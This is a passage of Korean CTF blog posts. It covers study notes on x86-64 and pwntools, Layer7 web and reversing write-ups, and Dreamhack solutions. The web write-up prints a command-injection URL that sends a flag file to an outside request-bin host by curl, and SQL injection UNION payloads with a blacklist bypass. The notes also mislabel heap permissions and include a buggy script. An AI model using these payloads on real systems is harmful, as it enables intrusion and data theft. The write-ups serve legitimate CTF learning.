[{"content":"Dreamhack 학습 정리 (~ pwntools 기초) 컴퓨터 아키텍처 컴퓨터 아키텍처는 컴퓨터에 관한 설계를 뜻한다.\n컴퓨터 아키텍처는 명령어적 설계인 명령어 집합구조(Instruction Set Architecture)와 하드웨어적 설계인 마이크로 아키텍처(Micro Architecture)로 나뉜다.\n특히 CPU가 컴퓨터의 동작에 핵심적인 역할을 하기 때문에, 명령어 집합구조를 알 필요가 있다.\n폰 노이만 구조 근대의 컴퓨터는 폰 노이만 구조에 기반을 둔다.\n폰 노이만 구조는 연산, 제어, 저장의 세 가지 핵심 기능이 필요로 한다.\n근대의 컴퓨터는 CPU가 연산과 제어를, 메모리가 저장을 담당한다.\n또한 버스(Bus)라는 전자 통로가 추가적으로 존재하는데, 장치간 데이터나 제어 신호를 교환하기 위해 사용한다.\n명령어 집합 구조 명령어 집합 구조는 크게 CISC와 RISC 두 가지로 나눈다.\nCISC : 70년대에 메모리 효율성에 맞춰 개발된 명령어 집합 구조이다. 예로는 x86-64가 이를 사용한다. RISC : 80년대에 CISC 구조의 단점을 개선하여 나온 명령어 집합 구조이며, 명령어 길이가 짧고 고정된 길이의 명령어만 사용한다. 예로는 ARM과 MIPS가 이를 사용한다. 아직 x86-64 아키텍처를 PC에서 가장 보편적으로 사용하기 때문에 이를 깊게 공부할 필요가 있다.\nx86-64의 이름을 봐도 알 수 있듯이 32비트와 64비트를 모두 호환하여 지원하는 아키텍처인데, 여기서 말하는 n비트는 cpu가 한번에 처리할 수 있는 데이터의 크기를 말한다.\n또한 WORD라는 표현은 16비트를 말하는데, WORD 또한 CPU로 한 번에 처리할 수 있는 데이터의 크기를 이르는 말이었지만, 16비트를 사용할 때 쓰던 WORD가 굳어져 쓰이게 되었다.\nx86-64: 레지스터 범용 레지스터 주로 데이터 연산을 위해 사용하는 레지스터이다.\n특정 레지스터의 경우 주로 사용하는 용도가 있다.\nrax : 함수의 반환값 rcx : 반복문 카운터 rsi : 데이터 원본 포인터 rdi : 데이터 목적지 포인터 rsp : 스택 포인터 rbp : 스택 베이스 포인터 세그먼트 레지스터 메모리를 세그먼트 단위로 접근할 때 사용하는 특수한 레지스터이다.\nCS : 실행할 코드의 시작 주소 저장 DS : 데이터 영역의 시작 주소 저장 SS : 스택 영역의 시작 주소 저장 ES, FS, GS : 범용적인 용도로 사용 명령어 포인터 레지스터 명령어 포인터 레지스터는 CPU가 어느 부분의 코드를 실행할지 가리키는 역할을 한다.\nx64 아키텍처에서의 명령어 포인터 레지스터는 rip이다.\n플래그 레지스터 플래그 레지스터는 CPU가 연산을 수행한 후 결과의 상태를 저장하는 레지스터이다.\n대표적으로는 ZF, CF, SF, OF 등이 있다.\nZF : 연산 결과가 0인 경우 설정 CF : 올림수가 있는 경우 설정 SF : 연산 결과가 음수인 경우 설정 OF : 오버플로우 발생 시 설정 메모리 레이아웃 리눅스에서 프로세스의 메모리는 크게 5가지 세그먼트로 구분한다.\n코드, 데이터, BSS, 힙, 스택이 있다.\n코드 세그먼트 (R - X) 실행 가능한 기계어 코드가 위치하는 영역이다. 가장 낮은 주소에 위치한다.\n쓰기 권한이 주어지지 않는 이유는 취약점을 통해 악의적인 공격이 가능하기 때문이다.\n데이터 세그먼트 (R W - / R - -) 컴파일 시점에서 값이 정해진 전역 변수 및 전역 상수들이 위치하는 영역이다.\n데이터 세그먼트의 경우에는 쓰기 가능한 영역과 불가능한 영역으로 다시 나뉜다.\nrodata 영역은 쓰기 불가능한 읽기 전용 영역이다.\nBSS 세그먼트 (R W -) 컴파일 시점에 값이 정해지지 않은 전역 변수가 위치하는 영역이다.\n초기화되지 않은 값은 프로그램이 시작될 때 0으로 초기화된다.\n스택 세그먼트 (R W -) 프로세스의 스택이 위치하는 영역이다.\n함수의 매개변수나 지역 변수와 같은 임시 변수들이 이곳에 저장된다.\n힙 세그먼트 (R - X) 동적으로 할당받는 메모리가 위치하는 영역이다.\n힙 세그먼트는 스택 세그먼트와 반대 방향으로 자란다. (낮은 주소에서 높은 주소로)\n어셈블리어 어셈블리어는 기계어와 1대1 대응되는 저수준 언어이다.\n기계어를 보다 쉽게 이해하고 분석하기 위해 사용한다.\n문법 구조 어셈블리어의 기본 문법 구조는 명령어(Opcode)와 피연산자(Operand)로 구성된다.\n예를 들어, mov rax, 0x30에서 명령어는 mov이고, 피연산자는 rax와 0x30이다.\n명령어 종류 어셈블리어에는 매우 많은 명령어가 존재하지만 자주 사용되는 것은 저절로 알게 된다.\n데이터 이동 : mov, lea 산술 연산 : inc, dec, add, sub 논리 연산 : and, or, xor, not 비교 : cmp, test 분기 : jmp, je, jg 스택 : pop, push 프로시저 : call, ret, leave 시스템 콜 : syscall GDB GDB는 바이너리를 디버깅하기 위한 도구이다.\n명령어 종류 file : 파일 불러오기 run : 실행 break : 중단점 설정 ni : 다음 코드 실행 si : 다음 코드 실행 (함수 내부로 진입) disassemble : 디스어셈블 코드 출력 x : 메모리 값 확인 vmmap : 가상 메모리 레이아웃 확인 set : 메모리 값 설정\nExercise: GDB b flag_1 명령어로 중단점을 설정한 뒤 실행하고, finish 명령어로 flag_1 함수를 끝까지 실행하게 되면 rax 레지스터에서 반환값을 확인할 수 있다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 pwndbg\u0026gt; disassemble Dump of assembler code for function main: 0x0000000000401156 \u0026lt;+0\u0026gt;: endbr64 0x000000000040115a \u0026lt;+4\u0026gt;: push rbp 0x000000000040115b \u0026lt;+5\u0026gt;: mov rbp,rsp 0x000000000040115e \u0026lt;+8\u0026gt;: lea rax,[rip+0xea3] # 0x402008 0x0000000000401165 \u0026lt;+15\u0026gt;: mov rdi,rax 0x0000000000401168 \u0026lt;+18\u0026gt;: call 0x401050 \u0026lt;puts@plt\u0026gt; 0x000000000040116d \u0026lt;+23\u0026gt;: call 0x401198 \u0026lt;flag_1\u0026gt; =\u0026gt; 0x0000000000401172 \u0026lt;+28\u0026gt;: movzx eax,BYTE PTR [rip+0x2ea7] # 0x404020 \u0026lt;a\u0026gt; 0x0000000000401179 \u0026lt;+35\u0026gt;: test al,al 0x000000000040117b \u0026lt;+37\u0026gt;: jne 0x401182 \u0026lt;main+44\u0026gt; 0x000000000040117d \u0026lt;+39\u0026gt;: call 0x401211 \u0026lt;flag_2\u0026gt; 0x0000000000401182 \u0026lt;+44\u0026gt;: lea rax,[rip+0xea7] # 0x402030 0x0000000000401189 \u0026lt;+51\u0026gt;: mov rdi,rax 0x000000000040118c \u0026lt;+54\u0026gt;: call 0x401050 \u0026lt;puts@plt\u0026gt; 0x0000000000401191 \u0026lt;+59\u0026gt;: mov eax,0x0 0x0000000000401196 \u0026lt;+64\u0026gt;: pop rbp 0x0000000000401197 \u0026lt;+65\u0026gt;: ret End of assembler dump. 디스어셈블을 보면 test 명령어를 통해 al 레지스터가 0인 경우에만 실행되는 것을 알 수 있는데, 해당 명령어 실행 직전에 set $al = 0 명령어를 통해 al 레지스터의 값을 0으로 변경해주면 flag_2 함수가 실행되어 플래그를 확인할 수 있다.\npwntools pwntools는 pwnable 분야의 CTF 문제를 푸는 데 도움을 주는 프레임워크이다.\n파이썬에서 사용할 수 있다.\n함수 종류 process() : 로컬 바이너리 연결 remote() : 원격 서버 연결 send() : 데이터 송신 recv() : 데이터 수신 close() : 연결 종료 이 외에도 다양한 함수가 존재한다.\naddition-quiz 파이썬으로 주어진 문제를 파싱하여 더한 값을 전송하는 코드를 작성하였다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 from pwn import * # io = process(\u0026#39;./chall\u0026#39;) io = remote(\u0026#39;host8.dreamhack.games\u0026#39;, 15434) for i in range(50): q = io.recvline().decode() x, y = q.split(\u0026#39;+\u0026#39;) y = y[:-3] a = int(x) + int(y) io.sendline(str(a)) io.interactive() flag-shop 파이썬으로 flag에 해당하는 번호를 전송하도록 코드를 작성하였다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from pwn import * io = remote(\u0026#34;host8.dreamhack.games\u0026#34;, 16567) for i in range(50): items = [] cnt = 0 for i in range(10): io.recvuntil(b\u0026#34;. \u0026#34;) items.append(io.recvline().decode().strip()) for i in range(len(fruit)): if items[i] == \u0026#34;flag\u0026#34;: break num +=1 io.recvuntil(b\u0026#34;\u0026gt; \u0026#34;) io.sendline(str(num).encode()) io.interactive() ","date":"2025-09-26T00:00:00Z","permalink":"https://t43w00.netlify.app/p/layer7-%EC%8B%9C%EC%8A%A4%ED%85%9C-%ED%95%B4%ED%82%B9-1%EC%B0%A8%EC%8B%9C/","title":"Layer7 시스템 해킹 1차시"},{"content":"Rednose U SSTI로 JWTKey를 얻을 수 있어서 대시보드에 접속할 수 있다.\n대시보드를 보면 /api/metar에서 airport 인자로 특정 주소에서 값을 가져오는 것으로 보이는데, 코드를 보면 curl을 실행하는 것을 확인할 수 있다.\n그래서 플래그를 읽어서 리퀘스트 빈에 보내도록 하였다.\nhttp://211.177.227.113:65303/api/metar?airport=-X%20POST%20https://cqymucy.request.dreamhack.games%20-d%20%22$(cat%20flag_qaiu.txt)%22\nW2 fstring으로 쿼리문을 처리하기 때문에 SQLI 취약점이 터진다.\nflags 테이블에 있는 플래그를 UNION 명령을 통해 출력하도록 하였다. 블랙리스트에 있는 select는 소문자만 막기 때문에 대문자로 우회 가능하다.\nhttp://211.177.227.113:65304/profile?id=1234%20UNION%20SELECT%20%27flag%27,flag_value,%27%27,%27secret%27%20FROM%20flags%20WHERE%20flag_name=%27main_flag%27--\nSRS 1 2 3 L7_WH_CTF/SRS/for_user via  v3.13.5 ❯ cat flag_server.py | grep Layer7{ \u0026#39;flag\u0026#39;: \u0026#39;Layer7{ssrf_easy}\u0026#39;, 문제 파일에 플래그가 하드코딩 되어있다.\nT야? 여기도 fstring으로 쿼리문을 처리해서 SQLI가 터지는 걸 알 수 있다.\nflags 테이블에서 플래그를 가져와 username에 UNION 해줬다.\n' UNION SELECT 1, flag_value, 'dummy', 'admin' FROM flags --\n","date":"2025-08-07T00:00:00Z","permalink":"https://t43w00.netlify.app/p/layer7-web-hacking-mini-ctf-write-up/","title":"Layer7 Web Hacking mini CTF | Write-up"},{"content":"One by One 1 2 3 Users/t43w00/Downloads via 🐍 v3.12.3 ❯ strings One_by_One | grep { Layer7{1f_u_p1ea2e_s01v3_but_s0_har6ly} 플래그가 하드 코딩 되어있다.\nWhat\u0026rsquo;s real? 문자열들을 확인해보니까 Wrong과 Correct가 있다. 저 부분이 입력값을 검증하는 부분으로 보인다.\n해당 부분을 보니 sub_140001640 함수에서 입력값을 암호화하여 비교하는 것 같다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 void *__fastcall sub_140001640(__int64 a1, void *a2) { void *v3; // rsp size_t v4; // r8 int v5; // r10d __int64 v6; // r11 int v7; // ebx __int64 v8; // r9 char i; // al unsigned int v10; // eax __int64 v11; // rax __int64 v12; // rax _BYTE Src[48]; // [rsp+20h] [rbp+0h] BYREF v3 = alloca(sub_1400026C0()); v7 = v4 - 1; if ( (int)v4 \u0026lt;= 0 ) { if ( v7 \u0026lt;= 0 ) return memcpy(a2, Src, v4); } else { v8 = 1; for ( i = 87; ; i = aWeHackTheUnive[v10 % 0x14] ) { Src[v8 - 1] = *(_BYTE *)(v6 + v8 - 1) ^ i; v10 = v8++; if ( (_DWORD)v4 + 1 == v8 ) break; } if ( v7 \u0026lt;= 0 ) goto LABEL_9; } v11 = 0; do { Src[v11] += Src[v11 + 1]; ++v11; } while ( v7 \u0026gt; (int)v11 ); if ( v5 \u0026gt; 0 ) { LABEL_9: v12 = 0; do { Src[v12] = __ROR1__(Src[v12], 3); ++v12; } while ( v5 \u0026gt; (int)v12 ); } return memcpy(a2, Src, v4); } 코드를 보면 a2를 Src에 복사하고 Src를 연산 후 a2에 다시 복사한다. 따라서 Src 값의 변화를 보면 되겠다.\n위 코드에서는 (xor 연산) -\u0026gt; (다음 바이트 더하기) -\u0026gt; (3비트 ROR) 순으로 진행되는데, 역으로 연산하여 플래그를 구할 수 있다.\nPython으로 구현하였다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 enc = [ 0xe3, 0x45, 0x6a, 0x08, 0xec, 0x8c, 0xc2, 0x4d, 0x34, 0xee, 0xb4, 0x4e, 0x46, 0x2c, 0x0b, 0xee, 0xf2, 0xcd, 0x4c, 0x2a, 0x0e, 0xab, 0xa7, 0xa6 ] key = \u0026#34;We_Hack_The_Universe\u0026#34; res = [0] * 24 for i in range(24): res[i] = ((enc[i] \u0026lt;\u0026lt; 3) | (enc[i] \u0026gt;\u0026gt; 5)) \u0026amp; 0xFF for i in range(22, -1, -1): res[i] = (res[i] - res[i + 1]) \u0026amp; 0xFF for i in range(24): if i == 0: res[i] = res[i] ^ 0x57 else: res[i] = res[i] ^ ord(key[i % 20]) print(\u0026#39;\u0026#39;.join(chr(c) for c in res)) Layer7, Thief the monariza jpg 파일이 제공되었는데, 힌트가 파일 시그니쳐길래 HxD로 까봤더니 시그니쳐가 jpg의 시그니쳐가 아니라서 수정했더니 플래그가 나왔다.\nYEKROX 제목이 XORKEY를 거꾸로 해서 그렇다고 한다.\n입력값을 XOR로 암호화해서 비교하는 것 같다.\n1 2 3 4 5 6 7 8 enc = [ 0x0e, 0x22, 0x3d, 0x20, 0x34, 0x70, 0x33, 0x20, 0x2d, 0x24, 0x13, 0x20, 0x21, 0x3b, 0x20, 0x3e, 0x3d, 0x3f, 0x39, 0x2c, 0x33, 0x38, 0x36, 0x06, 0x3d, 0x3a, 0x25, 0x28, 0x30, 0x00, 0x15, 0x0f, 0x06, 0x06, 0x16, 0x18 ] for i in range(36): print(chr((i + 0x42) ^ enc[i]), end = \u0026#39;\u0026#39;) Secret Present XOR 연산을 통해 파일을 암호화한다. 근데 이제 특정 키 파일을 통해서.\n근데 이제 키 파일이 4개 뿐이다. 하나씩 해보면 되겠다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 with open(\u0026#34;./Encrypted.png\u0026#34;, \u0026#34;rb\u0026#34;) as encpng: enc = encpng.read() with open(\u0026#34;./3.png\u0026#34;, \u0026#34;rb\u0026#34;) as keypng: key = keypng.read() dec = bytearray() for i in range(len(enc)): res = (i + 3 * 13) \u0026amp; 0xFF og = (enc[i] ^ res ^ key[i]) \u0026amp; 0xFF dec.append(og) with open(\u0026#34;./dec.png\u0026#34;, \u0026#34;wb\u0026#34;) as decpng: decpng.write(dec) 3으로 했더니 됐다.\nXORING 평범한 입력값 맞추는 문제같다.\nXOR 연산으로 암호화를 하나보다.\n1 2 3 4 5 6 7 8 9 10 11 enc = [ 0x06, 0x22, 0x2f, 0xd0, 0x20, 0x44, 0x39, 0x30, 0x2b, 0x67, 0x63, 0x64, 0x12, 0x65, 0x73, 0x1a, 0x72, 0x72, 0x58, 0xa0, 0x87, 0xab, 0x5f, 0x85, 0x81, 0x97, 0x8d, 0xec, 0xec, 0xec, 0xef ] key = 3 for i in range(31): dec = (((enc[i] ^ 0x5a) - 0xd) ^ key) \u0026amp; 0xFF print(chr(dec), end = \u0026#39;\u0026#39;) key = (key + 7) % 256 How can i live without u 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 __int64 __fastcall main(int a1, char **a2, char **a3) { int v3; // eax int v4; // edx int i; // eax char v6; // cl __int64 v7; // rdx size_t v8; // rax char *v9; // rdx char v10; // al __int64 j; // rax char *v12; // r8 char *v13; // rdx int v14; // eax char v15; // cl char *v16; // rax int v17; // ecx int v18; // edx int v19; // esi __int64 k; // rsi int v21; // edx char v22; // al char v23; // al unsigned int v24; // r12d int v26; // [rsp+Ch] [rbp-1FCh] __int128 v27; // [rsp+10h] [rbp-1F8h] BYREF _BYTE v28[64]; // [rsp+20h] [rbp-1E8h] BYREF char s1[144]; // [rsp+60h] [rbp-1A8h] BYREF char s[280]; // [rsp+F0h] [rbp-118h] BYREF v3 = 0; v26 = 305419896; do { v4 = v3 ^ v26; v3 -= 1640531527; v26 = v4; } while ( v3 != -844395452 ); for ( i = 0; i != 64; ++i ) { v6 = i; v7 = i; v28[v7] = v6 ^ 0x5A; } __printf_chk(1, \u0026#34;Enter the flag: \u0026#34;); fflush(stdout); if ( fgets(s, 256, stdin) ) { v8 = strcspn(s, \u0026#34;\\n\u0026#34;); v9 = (char *)\u0026amp;v27; s[v8] = 0; v10 = 0; v27 = 0; while ( 1 ) { *v9++ = __ROL1__(~v10, 1) + 51; if ( v28 == v9 ) break; v10 = *v9; } if ( strlen(s) != 144 ) goto LABEL_23; for ( j = 0; j != 144; ++j ) s1[j] = s[j]; v12 = s1; v13 = s1; v14 = 0; do { v15 = v14; v14 += 23; *v13++ ^= v15 ^ 0x42; } while ( (_BYTE)v14 != 0xF0 ); v16 = s1; v17 = 55; v18 = 19; do { *v16 += v18; v19 = v17; ++v16; v17 += v18; v18 = v19; } while ( s != v16 ); for ( k = 0; k != 144; ++k ) s1[k] = __ROL1__(s1[k], k % 7 + 1); v21 = 0; do { v22 = *v12++; v23 = v21 ^ v22; v21 += 3; *(v12 - 1) = v23 ^ 0xAA; } while ( s != v12 ); v24 = memcmp(s1, \u0026amp;unk_402040, 0x90u); if ( v24 ) { LABEL_23: v24 = 1; __printf_chk(1, \u0026#34;Wrong!\\n\u0026#34;); } else { __printf_chk(1, \u0026#34;Yes\\n\u0026#34;); } } else { v24 = 1; __printf_chk(1, \u0026#34;Error reading input!\\n\u0026#34;); } return v24; } 늘 먹던 맛이다. 진부하다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 def ror(x, n): return (x \u0026gt;\u0026gt; n) | (x \u0026lt;\u0026lt; (8 - n)) \u0026amp; 0xFF target = [ 0xE8, 0x04, 0x56, 0x9D, 0x40, 0x31, 0xDD, 0x99, 0xD6, 0xAC, 0x77, 0x4B, 0xAD, 0xE5, 0xFB, 0xEA, 0xDC, 0x9C, 0xF7, 0xF4, 0x55, 0xC4, 0xD8, 0x44, 0x23, 0x04, 0xAB, 0x74, 0xA6, 0x9C, 0xCE, 0x32, 0x60, 0xF0, 0x03, 0x6F, 0x65, 0xD6, 0xC9, 0x91, 0xDE, 0x42, 0xEC, 0x71, 0xA3, 0xC5, 0xA8, 0x86, 0x66, 0x69, 0x56, 0xCE, 0x77, 0x5F, 0xB0, 0x25, 0x05, 0x71, 0xD9, 0x35, 0x97, 0xEF, 0x90, 0x71, 0x88, 0x12, 0xCA, 0x8A, 0x92, 0x64, 0x40, 0x88, 0x5E, 0xD3, 0x79, 0x82, 0xC2, 0x02, 0x18, 0xEB, 0x10, 0x75, 0xDC, 0x27, 0x66, 0xDC, 0x7A, 0x39, 0x42, 0x4B, 0x32, 0x78, 0x9E, 0x2A, 0x46, 0xDD, 0x94, 0x0D, 0xE6, 0x8D, 0x21, 0xC6, 0x9E, 0x67, 0x67, 0x80, 0xB5, 0x22, 0xEE, 0xB4, 0xE6, 0x76, 0xC1, 0x95, 0x07, 0x69, 0x92, 0x59, 0x1B, 0x33, 0x83, 0xD0, 0xDD, 0x1C, 0xDE, 0x4E, 0x50, 0x43, 0x52, 0xA5, 0x84, 0x8B, 0x8E, 0x41, 0x18, 0x25, 0x63, 0x9A, 0x78, 0x10, 0x8C, 0xA8, 0x60, 0xAB ] s1 = target.copy() v21 = 0 for i in range(144): s1[i] ^= 0xAA s1[i] ^= v21 v21 = (v21 + 3) \u0026amp; 0xFF for i in range(144): s1[i] = ror(s1[i], i % 7 + 1) v17 = 55 v18 = 19 for i in range(144): s1[i] = (s1[i] - v18) \u0026amp; 0xFF v19 = v17 v17 = (v17 + v18) \u0026amp; 0xFF v18 = v19 v14 = 0 for i in range(144): s1[i] ^= (v14 ^ 0x42) \u0026amp; 0xFF v14 = (v14 + 23) \u0026amp; 0xFF print(\u0026#39;\u0026#39;.join(chr(c) for c in s1)) 가랏 피카츄! 피카피카 피카츄\n입력을 받고 ch4n63 함수의 반환값이 ture면 플래그가 출력된다.\nch4n63 함수 보니까 tr4n5f0rm 함수의 반환값이 target이랑 같아야 한다.\ntr4n5f0rm 함수를 보면 반환값이 (v11 + v9) % 95 + 32이기 때문에 v11과 v9만 잘 추적해서 역으로 연산하면 될 것 같다.\nf1r57_c0md1710n 함수는 그대로 구현해서 반환값을 구할 수 있고 c0mpl3x_ch4n63 함수는 실질적으로 연산되는 것이 없다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 pikalang = \u0026#34;7V`vEQ8P?U0\u0026#34; for i, ch in enumerate(pikalang): for c in range(32, 127): tmp = c if i % 3 == 0: tmp = ((tmp \u0026gt;\u0026gt; 1) + 3) ^ (i * 5) elif i % 3 == 1: tmp = ((tmp \u0026lt;\u0026lt; 1) ^ (i + 9)) - 7 else: t1 = ((tmp ^ (i * 11)) + 17) t2 = ((tmp \u0026amp; 0xF0) \u0026gt;\u0026gt; 3) tmp = t1 ^ t2 if i % 2 == 0: tmp ^= 0x3A else: tmp += 0x21 tmp = (tmp % 95) + 32 if tmp == ord(ch): print(chr(c), end=\u0026#39;\u0026#39;) break 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ❯ ./pikachu Ａ__Ａ (o・ω・) /ヽヘし ! ＼/ヽｕ─ｕ\u0026#39; 피카츄를 위해 명령을 내려주세요! \u0026gt;\u0026gt; Thund2rbDlt 피카츄의 공격은 지우에게 효과과 굉장했다! 지우가 쓰러졌다. 지우의 전리품인 Flag를 얻었다! Flag: Layer7{ffffffff00001941FFFFE6BE} Game Clear ","date":"2025-07-21T00:00:00Z","permalink":"https://t43w00.netlify.app/p/layer7-reversing-mini-ctf-write-up/","title":"Layer7 Reversing mini CTF | Write-up"},{"content":"CTFd 문제 풀이 정리 Custom 1 디컴파일된 main 함수의 코드를 보면 플래그를 동적으로 생성하고, 사용자에게 입력받은 값을 비교하는 것을 확인할 수 있다.\ngdb를 이용하여 플래그를 생성한 위치에서 스택을 확인하여 플래그를 획득하였다.\nCustom 2 디컴파일된 코드를 보면, 플래그와 관련된 출력이나 연산이 없다는 것을 알 수 있다.\n함수 목록에서 print_flag라는 이름의 함수를 확인할 수 있었는데, 이를 gdb를 이용하여 실행해보았다.\n플래그처럼 보이는 문자열이 나왔는데 중간에 unprintable char가 있다. 플래그 안의 값이 base64로 인코딩된 형식처럼 보였다. printable char를 대입하여 각각 디코딩해서 정상적인 문장을 찾아보았다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 import base64 encoded = \u0026#34;TG92ZWx5IHRvIGJlIHNpdHRpbmcgaGVyZSB3aXRoIHlv�QpZb3UncmUga2luZGEgY3V0ZSwgYnV0IGl0J3MgUmFpbmluZyBoYXJkZXI=\u0026#34; for i in range(0x30, 0x7A): try: encoded = encoded[:44] + chr(i) + encoded[45:] decoded = base64.b64decode(encoded.encode(\u0026#39;ascii\u0026#39;)) print(chr(i), \u0026#39;\\t\u0026#39;, decoded) except: print(end=\u0026#39;\u0026#39;) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 0 b\u0026#34;Lovely to be sitting here with yo\\xd1\\nYou\u0026#39;re kinda cute, but it\u0026#39;s Raining harder\u0026#34; 1 b\u0026#34;Lovely to be sitting here with yo\\xd5\\nYou\u0026#39;re kinda cute, but it\u0026#39;s Raining harder\u0026#34; 2 b\u0026#34;Lovely to be sitting here with yo\\xd9\\nYou\u0026#39;re kinda cute, but it\u0026#39;s Raining harder\u0026#34; 3 b\u0026#34;Lovely to be sitting here with yo\\xdd\\nYou\u0026#39;re kinda cute, but it\u0026#39;s Raining harder\u0026#34; 4 b\u0026#34;Lovely to be sitting here with yo\\xe1\\nYou\u0026#39;re kinda cute, but it\u0026#39;s Raining harder\u0026#34; 5 b\u0026#34;Lovely to be sitting here with yo\\xe5\\nYou\u0026#39;re kinda cute, but it\u0026#39;s Raining harder\u0026#34; 6 b\u0026#34;Lovely to be sitting here with yo\\xe9\\nYou\u0026#39;re kinda cute, but it\u0026#39;s Raining harder\u0026#34; . . ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ d b\u0026#34;Lovely to be sitting here with you\\nYou\u0026#39;re kinda cute, but it\u0026#39;s Raining harder\u0026#34; ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ ↑ . . u b\u0026#34;Lovely to be sitting here with yo\\xb9\\nYou\u0026#39;re kinda cute, but it\u0026#39;s Raining harder\u0026#34; v b\u0026#34;Lovely to be sitting here with yo\\xbd\\nYou\u0026#39;re kinda cute, but it\u0026#39;s Raining harder\u0026#34; w b\u0026#34;Lovely to be sitting here with yo\\xc1\\nYou\u0026#39;re kinda cute, but it\u0026#39;s Raining harder\u0026#34; x b\u0026#34;Lovely to be sitting here with yo\\xc5\\nYou\u0026#39;re kinda cute, but it\u0026#39;s Raining harder\u0026#34; y b\u0026#34;Lovely to be sitting here with yo\\xc9\\nYou\u0026#39;re kinda cute, but it\u0026#39;s Raining harder\u0026#34; d가 가장 적절해보인다. 따라서 해당 unprintable char를 d로 바꿔주었더니, 플래그 제출에 성공하였다.\nDreamhack Reverse Engineering 학습 Dreamhack 워게임 풀이 legacyopt 디컴파일된 코드를 보니, 사용자에게 입력을 받아 sub_1209 함수를 통해 연산을 한 뒤 출력을 하는 것 같다.\n문제 파일에는 output.txt 파일이 포함되어 있는데, 이를 통해 역연산하여 입력값을 구하면 될 것 같다.\n1 220c6a33204455fb390074013c4156d704316528205156d70b217c14255b6ce10837651234464e sub_1209 함수는 아래와 같다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 unsigned __int64 __fastcall sub_1209(_BYTE *a1, char *a2, int a3) { int v3; // eax int v4; // edx char *v5; // rax char v6; // cl _BYTE *v7; // rax char *v8; // rax char v9; // cl _BYTE *v10; // rax char *v11; // rax char v12; // cl _BYTE *v13; // rax char *v14; // rax char v15; // cl _BYTE *v16; // rax char *v17; // rax char v18; // cl _BYTE *v19; // rax char *v20; // rax char v21; // cl _BYTE *v22; // rax char *v23; // rax char v24; // cl _BYTE *v25; // rax char *v26; // rax char v27; // cl unsigned __int64 result; // rax int v32; // [rsp+20h] [rbp-4h] v3 = a3 + 7; v4 = a3 + 14; if ( v3 \u0026lt; 0 ) v3 = v4; v32 = v3 \u0026gt;\u0026gt; 3; switch ( a3 % 8 ) { case 0: goto LABEL_4; case 1: goto LABEL_11; case 2: goto LABEL_10; case 3: goto LABEL_9; case 4: goto LABEL_8; case 5: goto LABEL_7; case 6: goto LABEL_6; case 7: while ( 1 ) { v8 = a2++; v9 = *v8; v10 = a1++; *v10 = v9 ^ 0x66; LABEL_6: v11 = a2++; v12 = *v11; v13 = a1++; *v13 = v12 ^ 0x44; LABEL_7: v14 = a2++; v15 = *v14; v16 = a1++; *v16 = v15 ^ 0x11; LABEL_8: v17 = a2++; v18 = *v17; v19 = a1++; *v19 = v18 ^ 0x77; LABEL_9: v20 = a2++; v21 = *v20; v22 = a1++; *v22 = v21 ^ 0x55; LABEL_10: v23 = a2++; v24 = *v23; v25 = a1++; *v25 = v24 ^ 0x22; LABEL_11: v26 = a2++; v27 = *v26; result = (unsigned __int64)a1++; *(_BYTE *)result = v27 ^ 0x33; if ( --v32 \u0026lt;= 0 ) break; LABEL_4: v5 = a2++; v6 = *v5; v7 = a1++; *v7 = v6 ^ 0x88; } break; default: result = (unsigned int)(a3 % 8); break; } return result; } 코드를 보면 switch-case문을 통해 a3 % 8에 해당하는 case로 분기하는 것을 알 수 있는데, output.txt가 39byte이므로, case 7(39 % 8)으로 분기하는 것을 알 수 있다.\n따라서 입력받은 값에 case 7부터 시작해서 순서대로 [0x66, 0x44, 0x11, 0x77, 0x55, 0x22, 0x33, 0x88] 값들과 xor 연산을 반복해주는 것이다.\nPython으로 역연산하여 입력값을 구하는 코드를 작성하였다.\n1 2 3 4 5 6 output = \u0026#34;220c6a33204455fb390074013c4156d704316528205156d70b217c14255b6ce10837651234464e\u0026#34; data = bytes.fromhex(output) key = [0x66, 0x44, 0x11, 0x77, 0x55, 0x22, 0x33, 0x88] for i in range(len(data)): print(chr(data[i] ^ key[i % 8]), end=\u0026#34;\u0026#34;) Recover 디컴파일된 